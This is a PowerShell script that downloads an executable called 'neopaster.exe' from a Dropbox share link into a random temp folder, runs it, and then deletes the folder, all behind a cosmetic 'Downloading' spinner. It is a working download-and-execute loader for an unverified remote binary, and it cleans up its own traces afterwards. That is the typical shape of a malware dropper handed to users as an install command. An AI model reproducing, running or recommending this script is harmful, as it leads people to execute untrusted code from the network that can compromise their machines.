# Add loading animation function
function Show-Loading {
    param(
        [string]$Message = "Downloading",
        [int]$Delay = 100
    )
    $spinner = @('|', '/', '-', '\')
    $job = Start-Job -ScriptBlock {
        param($msg, $delay, $spinner)
        $idx = 0
        while ($true) {
            Write-Host "`r$msg $($spinner[$idx % 4])" -NoNewline -ForegroundColor Cyan
            Start-Sleep -Milliseconds $delay
            $idx++
        }
    } -ArgumentList $Message, $Delay, $spinner
    return $job
}

$url = "https://www.dropbox.com/scl/fi/pywkslydef69f64ga6ukp/neopaster.exe?rlkey=yjfxi2hibb9bmdhe7acs94yu2&st=4xf7ng1c&dl=1"  
$tempdir = "$env:TEMP\$(New-Guid)" 

try {
    # Create temp directory
    mkdir $tempdir -Force | Out-Null
    $file = "$tempdir\app.exe"

    # Start loading animation
    $loadingJob = Show-Loading -Message "Downloading neopaster.exe" -Delay 150
    Write-Host "`n"  # New line for better spacing

    # Download file
    Invoke-RestMethod -Uri $url -OutFile $file -ErrorAction Stop

    # Stop animation and show completion
    if ($loadingJob) {
        Stop-Job -Job $loadingJob -PassThru | Remove-Job -Force
        Write-Host "`rDownload complete!`n" -ForegroundColor Green
    }

    # Execute file with status
    Write-Host "Starting application..." -ForegroundColor Yellow
    $proc = Start-Process $file -PassThru -Wait 
    Write-Host "Process exited with code: $($proc.ExitCode)" -ForegroundColor White

} catch {
    Write-Error "`nAn error occurred: $_" -ErrorAction Continue
} finally {
    # Cleanup animation if still running
    if ($loadingJob.State -eq 'Running') {
        Stop-Job -Job $loadingJob -PassThru | Remove-Job -Force
    }
    # Clear animation line
    Write-Host "`r" + (' ' * ($Host.UI.RawUI.WindowSize.Width)) + "`r" -NoNewline
    
    # Cleanup files
    Remove-Item $tempdir -Recurse -Force -ErrorAction SilentlyContinue
    Write-Host "Temporary files cleaned" -ForegroundColor DarkGray
}
